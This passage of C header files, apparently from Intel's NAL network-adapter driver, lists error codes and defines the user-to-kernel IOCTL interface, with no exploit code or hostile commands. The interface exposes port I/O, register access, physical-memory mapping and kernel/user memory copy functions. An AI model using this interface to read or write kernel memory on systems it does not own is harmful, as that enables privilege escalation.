#define NAL_FLASH_DEVICE_TOO_SMALL NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x203F, "Flash device is too small for this image")
#define NAL_ALTRAM_READ_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2040, "AltRAM read failed")
#define NAL_ALTRAM_WRITE_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x2041, "AltRAM write failed")
#define NAL_EEPROM_FW_CRC_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202D, "Failed to calculate Firmware CRC/Checksum.")
#define NAL_EEPROM_FW_CSUM_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x202C, "Firmware Checksum validation failed.")

#define NAL_RSDP_TABLE_NOT_FOUND NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1001, "RSDP BIOS Table was not found")
#define NAL_ACPI_TABLE_NOT_FOUND NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1002, "ACPI BIOS Table was not found")
#define NAL_PCIE_TABLE_NOT_FOUND NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1003, "PCIE BIOS Table was not found")

#define NAL_QUEUE_NOT_DISABLED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1004, "Failed to disable the queue")
#define NAL_QUEUE_NOT_ENABLED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1005, "Failed to enable the queue")
#define NAL_AQUEUE_INITIALIZATION_FAILED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1006, "Failed to initialize admin queue")

#define NAL_PROTECTION_DOMAIN_MISMATCH NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1007, "Protection Domain Mismatch")

#define NAL_OTP_CANT_BE_UPDATED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1008, "OTP can't be updated")
#define NAL_OTP_ACCESS_ERROR NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x1009, "OTP access failed.")

#define NAL_SFP_EEPROM_ACCESS_ERROR NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x100A, "SFP EEPROM access failed.")

#define NAL_ICSP_NOT_ENABLED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x100B, "ICSP Protocol is not enabled.")
#define NAL_ICSP_ID_UNKNOWN NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x100C, "Unknown Microcontroller Device ID.")

#define NAL_PHY_MODE_UNSUPPORTED NalMakeCode(NAL_CODE_ERROR, CODE_NAL, 0x100D, "Current PHY mode is not supported.")

#endif

```

`source/IntelNal/inc/nalioctl.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

*/

/*
 *
 * Module Name:
 *   nalioctl.h
 *
 * Abstract:
 *   Contains the ioctl values for sharing between the user mode app
 *   and the nal driver. This file is shared by all protected mode
 *   operating system NAL implementations.
 *
 */


#ifndef __NALIOCTL_H__
#define __NALIOCTL_H__

#include "naltypes.h"
#include "nalcodes.h"
#include "os_i.h"
#include "hwbus_t.h"

#define NAL_MAX_DEBUG_PRINT_LENGTH 200
#define RETURN

#define IOCTL_NAL_OSI NAL_MAKE_IOCTL(0)
#define IOCTL_NAL_HW_BUS NAL_MAKE_IOCTL(1)
#define IOCTL_NAL_NDI NAL_MAKE_IOCTL(2)
#define IOCTL_NAL_OS_SPECIFIC NAL_MAKE_IOCTL(3)

#define NAL_READPORT8_FUNCID 1
#define NAL_READPORT16_FUNCID 2
#define NAL_READPORT32_FUNCID 3
#define NAL_WRITEPORT8_FUNCID 7
#define NAL_WRITEPORT16_FUNCID 8
#define NAL_WRITEPORT32_FUNCID 9
#define NAL_READREGISTER8_FUNCID 13
#define NAL_READREGISTER16_FUNCID 14
#define NAL_READREGISTER32_FUNCID 15
#define NAL_WRITEREGISTER8_FUNCID 19
#define NAL_WRITEREGISTER16_FUNCID 20
#define NAL_WRITEREGISTER32_FUNCID 21
#define NAL_MMAPADDRESS_FUNCID 25
#define NAL_UNMAPADDRESS_FUNCID 26
#define NAL_GETTIMESTAMP_FUNCID 27
#define NAL_GETTIMESTAMPSPERMICROSECOND_FUNCID 28
#define NAL_REGISTERTIMERCALLBACK_FUNCID 33
#define NAL_UNREGISTERTIMERCALLBACK_FUNCID 34
#define NAL_DELAYMILLISECONDS_FUNCID 35
#define NAL_DELAYMICROSECONDS_FUNCID 36
#define NAL_GETPHYSICALMEMORYADDRESS_FUNCID 37
#define NAL_ALLOCATEMEMORYNONPAGED_FUNCID 38
#define NAL_FREEMEMORYNONPAGED_FUNCID 39
#define NAL_ATOMICINCREMENT32_FUNCID 40
#define NAL_ATOMICDECREMENT32_FUNCID 41
#define NAL_ATOMICTESTSET32_FUNCID 42
#define NAL_ACQUIRESPINLOCK_FUNCID 43
#define NAL_RELEASESPINLOCK_FUNCID 44
#define NAL_INITIALIZESPINLOCK_FUNCID 45
#define NAL_CHECKSECURITY_FUNCID 46
#define NAL_DEBUGPRINT_FUNCID 47
#define NAL_KMEMSET_FUNCID 48
#define NAL_KUMEMCPY_FUNCID 49
#define NAL_KKMEMCPY_FUNCID 50
#define NAL_UKMEMCPY_FUNCID 51
#define NAL_ENABLE_DEBUG_PRINT_FUNCID 54
#define NAL_ALLOCATEMEMORYNONPAGEDEX_FUNCID 55
#define NAL_FREEMEMORYNONPAGEDEX_FUNCID 56
#define NAL_MMAPADDRESSEX_FUNCID 57
#define NAL_UNMAPADDRESSEX_FUNCID 58
#define NAL_GETPHYSICALMEMORYADDRESSEX_FUNCID 59

#define NAL_READPCIDEVICECOUNT_FUNCID 1
#define NAL_READPCIDEVICE_FUNCID 2
#define NAL_FILLPCICONFIGSPEC_FUNCID 3
#define NAL_OSREADPCICONFIG32_FUNCID 4
#define NAL_OSWRITEPCICONFIG32_FUNCID 5
#define NAL_OSWRITEPCICONFIGVARIABLE_FUNCID 6
#define NAL_ENABLEPCIDEVICE_FUNCID 7

#define NAL_INITIALIZEINTERRUPTS_FUNCID 1
#define NAL_HASINTERRUPTOCCURRED_FUNCID 2
#define NAL_UNINITIALIZEINTERRUPTS_FUNCID 3

#define NAL_WIN_GET_PDO_POINTER_FUNCID 1
#define NAL_WIN_GET_SYMBOLIC_NAME_FUNCID 2
#define NAL_WIN_ALLOC_DEV_CONTEXT_FUNCID 3
#define NAL_WIN_FREE_DEV_CONTEXT_FUNCID 4
#define NAL_WIN_OS_DEVICE_FUNCID 5
#define NAL_WIN_DRIVER_GET_REF_COUNT_FUNCID 6
#define NAL_WIN_ADAPTER_IN_USE_FUNCID 7
#define NAL_WIN_IS_ADAPTER_IN_USE_FUNCID 8

#define NAL_LINUX_IS_ADAPTER_IN_USE_FUNCID 1
#define NAL_LINUX_ADAPTER_IN_USE_FUNCID 2
#define NAL_LINUX_REQUEST_REGIONS_FUNCID 3
#define NAL_LINUX_RELEASE_REGIONS_FUNCID 4
#define NAL_LINUX_GET_DRIVER_REFCOUNT_FUNCID 5
#define NAL_LINUX_INC_DRIVER_REFCOUNT_FUNCID 6
#define NAL_LINUX_DEC_DRIVER_REFCOUNT_FUNCID 7
#define NAL_LINUX_FILL_DEVICE_RESOURCE_FUNCID 8
#define NAL_LINUX_DRIVER_GET_VERSION 9
#define NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNCID 10
#define NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNCID 11
#define NAL_LINUX_READPCIEXBYTE_FUNCID 12
#define NAL_LINUX_WRITEPCIEXBYTE_FUNCID 13
#define NAL_LINUX_GET_RUN_DOMAIN_FUNCID 14

#define NAL_SOLARIS_IS_ADAPTER_IN_USE_FUNCID 1
#define NAL_SOLARIS_ADAPTER_IN_USE_FUNCID 2
#define NAL_SOLARIS_REQUEST_REGIONS_FUNCID 3
#define NAL_SOLARIS_RELEASE_REGIONS_FUNCID 4
#define NAL_SOLARIS_GET_DRIVER_REFCOUNT_FUNCID 5
#define NAL_SOLARIS_DRIVER_GET_VERSION 9
#define NAL_SOLARIS_ALLOCATEMEMORYNONPAGEDPCI_FUNCID 10
#define NAL_SOLARIS_FREEMEMORYNONPAGEDPCI_FUNCID 11

typedef union _NAL_UNSIGNED_UNION
{
    UINT8 Uint8;
    UINT16 Uint16;
    UINT32 Uint32;
    UINT64 Uint64;
} NAL_UNSIGNED_UNION;

typedef struct _NAL_WIN_DRIVER_GET_REF_COUNT_FUNC
{
    OUT UINT32 RefCount;
} NAL_WIN_DRIVER_GET_REF_COUNT_FUNC;

typedef struct _NAL_ADAPTER_IN_USE_FUNC
{
    IN NAL_DEVICE_LOCATION NalDevice;
    OUT BOOLEAN CanBeUsed;
    OUT BOOLEAN Locked;
} NAL_WIN_ADAPTER_IN_USE_FUNC,
  NAL_LINUX_ADAPTER_IN_USE_FUNC,
  NAL_SOLARIS_ADAPTER_IN_USE_FUNC;

typedef struct _NAL_IS_ADAPTER_IN_USE_FUNC
{
    IN NAL_DEVICE_LOCATION NalDevice;
    OUT BOOLEAN IsInUse;
} NAL_WIN_IS_ADAPTER_IN_USE_FUNC,
  NAL_LINUX_IS_ADAPTER_IN_USE_FUNC,
  NAL_SOLARIS_IS_ADAPTER_IN_USE_FUNC;

typedef struct _NAL_ENABLE_DEBUG_PRINT_FUNC
{
    IN BOOLEAN Enable;
} NAL_ENABLE_DEBUG_PRINT_FUNC;

typedef struct _NAL_WIN_GET_PDO_POINTER_FUNC
{
    IN OUT KVOID* DeviceContext;
    IN NAL_DEVICE_LOCATION PciLocation;
} NAL_WIN_GET_PDO_POINTER_FUNC;

typedef struct _NAL_WIN_GET_SYMBOLIC_NAME_FUNC
{
    IN KVOID* DeviceContext;
    OUT CHAR SymbolicName[260];
} NAL_WIN_GET_SYMBOLIC_NAME_FUNC;

typedef struct _NAL_WIN_ALLOC_DEV_CONTEXT_FUNC
{
    RETURN KVOID* ReturnValue;
} NAL_WIN_ALLOC_DEV_CONTEXT_FUNC;

typedef struct _NAL_WIN_FREE_DEV_CONTEXT_FUNC
{
    IN KVOID* DeviceContext;
} NAL_WIN_FREE_DEV_CONTEXT_FUNC;

typedef struct _NAL_LINUX_DEVICERESOURCE_FUNCS
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION DeviceLocation;
    OUT NAL_IO_RESOURCE NalIoResource[NAL_MAX_BARS];
    OUT KVOID* Pdev;
} NAL_LINUX_DEVICERESOURCE_FUNC,
  NAL_SOLARIS_REGION_FUNCS;

typedef struct _NAL_LINUX_REFCOUNT_FUNCS
{
    RETURN UINT32 ReturnValue;
} NAL_LINUX_REFCOUNT_FUNCS,
  NAL_SOLARIS_REFCOUNT_FUNCS;

typedef struct _NAL_LINUX_DRIVER_GET_VERSION_FUNCS
{
    OUT CHAR Version[32];
} NAL_LINUX_DRIVER_GET_VERSION_FUNCS,
  NAL_SOLARIS_DRIVER_GET_VERSION_FUNCS;

typedef struct _NAL_OS_DEVICE_FUNC
{
    IN NAL_MAC_TYPE MacType;
    IN NAL_DEVICE_LOCATION DeviceLocation;
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN KVOID* VirtualAddress;
    IN PORT_ADDR PortAddress;
    IN BOOLEAN IsDriverLoaded;
    IN OUT KVOID* DeviceContext;
    RETURN NAL_STATUS NalStatus;
} NAL_OS_DEVICE_FUNC;

typedef struct _NAL_INTERRUPT_FUNCS
{
    RETURN NAL_STATUS ReturnValue;
    RETURN BOOLEAN Triggered;
    IN KVOID* NalOsDevice;
} NAL_INTERRUPT_FUNCS;

typedef struct _NAL_READPORT_FUNCS
{
    NAL_UNSIGNED_UNION ReturnValue;
    PORT_ADDR Port;
} NAL_READPORT_FUNCS;

typedef struct _NAL_WRITEPORT_FUNCS
{
    RETURN BOOLEAN ReturnValue;
    IN PORT_ADDR Port;
    IN NAL_UNSIGNED_UNION Value;
} NAL_WRITEPORT_FUNCS;

typedef struct _NAL_READREGISTER_FUNCS
{
    RETURN NAL_UNSIGNED_UNION ReturnValue;
    IN KVOID* Address;
} NAL_READREGISTER_FUNCS;

typedef struct _NAL_READREGISTER_FUNCS_Ex
{
    RETURN NAL_UNSIGNED_UNION ReturnValue;
    IN KVOID* Address;
    IN NAL_DEVICE_LOCATION DeviceLocation;
} NAL_READREGISTER_FUNCS_Ex;

typedef struct _NAL_WRITEREGISTER_FUNCS
{
    RETURN BOOLEAN ReturnValue;
    IN KVOID* Address;
    IN NAL_UNSIGNED_UNION Value;
} NAL_WRITEREGISTER_FUNCS;
typedef struct _NAL_WRITEREGISTER_FUNCS_Ex
{
    RETURN BOOLEAN ReturnValue;
    IN KVOID* Address;
    IN NAL_UNSIGNED_UNION Value;
    IN NAL_DEVICE_LOCATION DeviceLocation;
} NAL_WRITEREGISTER_FUNCS_Ex;

typedef struct _NAL_MEMMAP_FUNCS
{
    RETURN NAL_STATUS ReturnValue;
    OUT KVOID* VirtualAddress;
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN OUT UINT32 Length;
    IN UINTN ProcessId;
} NAL_MEMMAP_FUNCS;

typedef struct _NAL_TIMESTAMP_FUNCS
{
    RETURN UINT64 ReturnValue;
} NAL_TIMESTAMP_FUNCS;

typedef struct _NAL_REGISTERTIMERCALLBACK_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_TIMER_CALLBACK TimerCallback;
    IN OUT UINT32 TimerInterval;
    IN UINTN Context;
    OUT UINT32 CallbackId;
} NAL_REGISTERTIMERCALLBACK_FUNC;

typedef struct _NAL_UNREGISTERTIMERCALLBACK_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN UINT32 CallbackId;
} NAL_UNREGISTERTIMERCALLBACK_FUNC;

typedef struct _NAL_DELAY_FUNCS
{
    IN UINT32 Delay;
} NAL_DELAY_FUNCS;

typedef struct _NAL_GETPHYSICALMEMORYADDRESS_FUNC
{
    RETURN NAL_PHYSICAL_ADDRESS ReturnValue;
    IN KVOID* VirtualAddress;
    IN UINTN ProcessId;
} NAL_GETPHYSICALMEMORYADDRESS_FUNC;

typedef struct _NAL_ALLOCATEMEMORYNONPAGED_FUNC
{
    RETURN KVOID* ReturnValue;
    IN UINT32 ByteCount;
    IN UINT32 Alignment;
    OUT NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN UINTN ProcessId;
} NAL_ALLOCATEMEMORYNONPAGED_FUNC;

typedef struct _NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNC
{
    IN KVOID* PDev;
    RETURN KVOID* ReturnValue;
    IN UINT32 ByteCount;
    IN UINT32 Alignment;
    OUT NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN UINTN ProcessId;
} NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNC,
    NAL_SOLARIS_ALLOCATEMEMORYNONPAGEDPCI_FUNC;

typedef struct _NAL_FREEMEMORYNONPAGED_FUNC
{
    IN KVOID* Address;
    IN UINTN ProcessId;
} NAL_FREEMEMORYNONPAGED_FUNC;

typedef struct _NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNC
{
    IN KVOID* PDev;
    IN KVOID* Address;
    IN NAL_PHYSICAL_ADDRESS PhysicalAddress;
    IN UINT32 Size;
} NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNC,
    NAL_SOLARIS_FREEMEMORYNONPAGEDPCI_FUNC;

typedef struct _NAL_ATOMIC_FUNCS
{
    RETURN UINT32 ReturnValue;
    IN OUT UINT32* Address;
} NAL_ATOMIC_FUNCS;

typedef struct _NAL_ATOMICTESTSET32_FUNC
{
    RETURN UINT32 ReturnValue;
    IN OUT UINT32* Address;
    IN UINT32 Test;
    IN UINT32 Set;
} NAL_ATOMICTESTSET32_FUNC;

typedef struct _NAL_SPINLOCK_FUNCS
{
    NAL_SPIN_LOCK SpinLock;
} NAL_SPINLOCK_FUNCS;

typedef struct _NAL_CHECKSECURITY_FUNC
{
    RETURN NAL_STATUS ReturnValue;
} NAL_CHECKSECURITY_FUNC;

typedef struct _NAL_DEBUGPRINT_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN CHAR Message[NAL_MAX_DEBUG_PRINT_LENGTH];
} NAL_DEBUGPRINT_FUNC;

typedef struct _NAL_READPCIDEVICECOUNT_FUNC
{
    RETURN UINT16 ReturnValue;
} NAL_READPCIDEVICECOUNT_FUNC;

typedef struct _NAL_READPCIDEVICE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN UINT16 Count;
    OUT NAL_DEVICE_LOCATION PciLocations[1];
} NAL_READPCIDEVICE_FUNC;

typedef struct _NAL_FILLPCICONFIGSPEC_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 DwordCount;
    OUT PCI_DEVICE PciDevice;
} NAL_FILLPCICONFIGSPEC_FUNC;

typedef struct _NAL_OSREADPCICONFIG32_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 DwordNumber;
    OUT UINT32 Value;
} NAL_OSREADPCICONFIG32_FUNC;

typedef struct _NAL_OSWRITEPCICONFIG32_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 DwordNumber;
    IN UINT32 Data;
} NAL_OSWRITEPCICONFIG32_FUNC;

typedef struct _NAL_OSWRITEPCICONFIGVARIABLE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 DwordNumber;
    IN UINT8 ByteMask;
    IN UINT32 Data;
} NAL_OSWRITEPCICONFIGVARIABLE_FUNC;

typedef struct _NAL_LINUX_OSREADPCIEXBYTE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 ByteIndex;
    OUT UINT8 Value;
} NAL_LINUX_READPCIEXBYTE_FUNC;

typedef struct _NAL_LINUX_WRITEPCIEXBYTE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION PciLocation;
    IN UINT32 ByteIndex;
    IN UINT8 Value;
} NAL_LINUX_WRITEPCIEXBYTE_FUNC;

typedef struct _NAL_KMEM_FUNCS
{
    IN KVOID* Source;
    IN KVOID* Destination;
    IN UINTN Size;
} NAL_KMEM_FUNCS;

typedef struct _NAL_KMEMSET_FUNC
{
    IN int Source;
    IN KVOID* Destination;
    IN UINTN Size;
} NAL_KMEMSET_FUNC;

typedef struct _NAL_ENABLEPCIDEVICE_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    IN NAL_DEVICE_LOCATION DeviceLocation;
} NAL_ENABLEPCIDEVICE_FUNC;

typedef struct _NAL_LINUX_RUN_DOMAIN_FUNC
{
    RETURN NAL_STATUS ReturnValue;
    OUT NAL_OS_RUN_DOMAIN RunDomain;
} NAL_LINUX_RUN_DOMAIN_FUNC;

typedef union _NAL_IOCTL_FUNCTION_DATA
{

    NAL_READPORT_FUNCS NalReadPortFuncs;
    NAL_WRITEPORT_FUNCS NalWritePortFuncs;
    NAL_READREGISTER_FUNCS NalReadRegisterFuncs;
    NAL_WRITEREGISTER_FUNCS NalWriteRegisterFuncs;
    NAL_MEMMAP_FUNCS NalMemmapFuncs;
    NAL_TIMESTAMP_FUNCS NalTimestampFuncs;
    NAL_INTERRUPT_FUNCS NalInterruptFuncs;
    NAL_REGISTERTIMERCALLBACK_FUNC NalRegisterTimerCallbackFunc;
    NAL_UNREGISTERTIMERCALLBACK_FUNC NalUnregisterTimerCallbackFunc;
    NAL_GETPHYSICALMEMORYADDRESS_FUNC NalGetPhysicalMemoryAddressFunc;
    NAL_DELAY_FUNCS NalDelayFuncs;
    NAL_ALLOCATEMEMORYNONPAGED_FUNC NalAllocateMemoryNonPagedFunc;
    NAL_FREEMEMORYNONPAGED_FUNC NalFreeMemoryNonPagedFunc;
    NAL_ATOMIC_FUNCS NalAtomicFuncs;
    NAL_ATOMICTESTSET32_FUNC NalAtomicTestSet32Func;
    NAL_SPINLOCK_FUNCS NalSpinlockFuncs;
    NAL_CHECKSECURITY_FUNC NalCheckSecurityFunc;
    NAL_DEBUGPRINT_FUNC NalDebugPrintFunc;
    NAL_KMEM_FUNCS NalKMemFuncs;
    NAL_KMEMSET_FUNC NalKMemsetFunc;
    NAL_ENABLE_DEBUG_PRINT_FUNC NalEnableDebugPrintFunc;

    NAL_READPCIDEVICECOUNT_FUNC NalReadPciDeviceCountFunc;
    NAL_READPCIDEVICE_FUNC NalReadPciDeviceFunc;
    NAL_FILLPCICONFIGSPEC_FUNC NalFillPciConfigSpecFunc;
    NAL_OSREADPCICONFIG32_FUNC NalOsReadPciConfig32Func;
    NAL_OSWRITEPCICONFIG32_FUNC NalOsWritePciConfig32Func;
    NAL_OSWRITEPCICONFIGVARIABLE_FUNC NalOsWritePciConfigVariableFunc;
    NAL_ENABLEPCIDEVICE_FUNC NalEnablePciDeviceFunc;

#if defined(NAL_WINNT_WDM)

    NAL_WIN_GET_PDO_POINTER_FUNC NalWinGetPdoPointerFunc;
    NAL_WIN_GET_SYMBOLIC_NAME_FUNC NalWinGetSymbolicNameFunc;
    NAL_WIN_ALLOC_DEV_CONTEXT_FUNC NalWinAllocDevContextFunc;
    NAL_WIN_FREE_DEV_CONTEXT_FUNC NalWinFreeDevContextFunc;
    NAL_OS_DEVICE_FUNC NalOsDevice;
    NAL_WIN_DRIVER_GET_REF_COUNT_FUNC NalWinDriverGetRefCountFunc;
    NAL_WIN_ADAPTER_IN_USE_FUNC NalWinAdapterInUseFunc;
    NAL_WIN_IS_ADAPTER_IN_USE_FUNC NalWinIsAdapterInUseFunc;
#endif

#if defined(NAL_LINUX)

    NAL_LINUX_ADAPTER_IN_USE_FUNC NalLinuxAdapterInUseFunc;
    NAL_LINUX_IS_ADAPTER_IN_USE_FUNC NalLinuxIsAdapterInUseFunc;
    NAL_LINUX_REFCOUNT_FUNCS NalLinuxReferenceCountFuncs;
    NAL_LINUX_DEVICERESOURCE_FUNC NalLinuxDeviceResourceFunc;
    NAL_LINUX_DRIVER_GET_VERSION_FUNCS NalLinuxDriverGetVersionFuncs;
    NAL_LINUX_ALLOCATEMEMORYNONPAGEDPCI_FUNC NalLinuxAllocateMemoryNonPagedPciFunc;
    NAL_LINUX_FREEMEMORYNONPAGEDPCI_FUNC NalLinuxFreeMemoryNonPagedPciFunc;
    NAL_LINUX_READPCIEXBYTE_FUNC NalLinuxReadPciExByteFunc;
    NAL_LINUX_WRITEPCIEXBYTE_FUNC NalLinuxWritePciExByteFunc;
    NAL_LINUX_RUN_DOMAIN_FUNC NalLinuxGetRunDomainFunc;
#endif

#if defined(NAL_SOLARIS)

    NAL_READREGISTER_FUNCS_Ex NalReadRegisterFuncsEx;
    NAL_WRITEREGISTER_FUNCS_Ex NalWriteRegisterFuncsEx;

    NAL_SOLARIS_ADAPTER_IN_USE_FUNC NalSolarisAdapterInUseFunc;
    NAL_SOLARIS_IS_ADAPTER_IN_USE_FUNC NalSolarisIsAdapterInUseFunc;
    NAL_SOLARIS_REGION_FUNCS NalSolarisRegionFuncs;
    NAL_SOLARIS_REFCOUNT_FUNCS NalSolarisReferenceCountFuncs;
    NAL_SOLARIS_DRIVER_GET_VERSION_FUNCS NalSolarisDriverGetVersionFuncs;
    NAL_SOLARIS_ALLOCATEMEMORYNONPAGEDPCI_FUNC NalSolarisAllocateMemoryNonPagedPciFunc;
    NAL_SOLARIS_FREEMEMORYNONPAGEDPCI_FUNC NalSolarisFreeMemoryNonPagedPciFunc;

#endif
} NAL_IOCTL_FUNCTION_DATA;

typedef struct _NAL_IOCTL
{
    UINT32 IoctlNumber;
    VOID* InputBuffer;
    UINT32 InputBufferSize;
    VOID* OutputBuffer;
    UINT32 OutputBufferSize;
} NAL_IOCTL;

typedef union _NAL_IOCTL_RETURN_DATA
{
    UINT8 Uint8;
    UINT16 Uint16;
    UINT32 Uint32;
    UINT64 Uint64;
    NAL_STATUS NalStatus;
    UINTN VoidPtr;
} NAL_IOCTL_RETURN_DATA;

typedef struct _NAL_IOCTL_INPUT_DATA
{
    UINT64 FunctionId;
    UINT32 Size;
    NAL_IOCTL_FUNCTION_DATA InputBuffer;
} NAL_IOCTL_INPUT_DATA;

#define NAL_IOCTL_INPUTBUFFER_SIZE(IoctlData) (UINT32)((sizeof(UINT64) * 2) + (IoctlData).Size)

NAL_STATUS
NalResolveNdiIoctl(
    IN NAL_IOCTL_INPUT_DATA* NalIoctl
    );

NAL_STATUS
NalResolveOsiIoctl(
    IN NAL_IOCTL_INPUT_DATA* NalIoctl
    );

NAL_STATUS
NalResolveHwBusIoctl(
    IN NAL_IOCTL_INPUT_DATA* NalIoctl
    );

NAL_STATUS
NalResolveOsSpecificIoctl(
    IN NAL_IOCTL_INPUT_DATA* NalIoctl
    );

#endif

```

`source/IntelNal/inc/naltypes.h`:

```h
/*

  This file is provided under a dual BSD/GPLv2 license.  When using or
  redistributing this file, you may do so under either license.

  GPL LICENSE SUMMARY

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.

  This program is free software; you can redistribute it and/or modify
  it under the terms of version 2 of the GNU General Public License as
  published by the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but
  WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St - Fifth Floor, Boston, MA 02110-1301 USA.
  The full GNU General Public License is included in this distribution
  in the file called LICENSE.GPL.

  Contact Information:
  e1000-devel Mailing List <e1000-devel@lists.sourceforge.net>
  Intel Corporation, 5200 N.E. Elam Young Parkway, Hillsboro, OR 97124-6497

  BSD LICENSE

  Copyright(c) 1999 - 2013 Intel Corporation. All rights reserved.
  All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:

    * Redistributions of source code must retain the above copyright
      notice, this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright
      notice, this list of conditions and the following disclaimer in
      the documentation and/or other materials provided with the
      distribution.
    * Neither the name of Intel Corporation nor the names of its
      contributors may be used to endorse or promote products derived
      from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
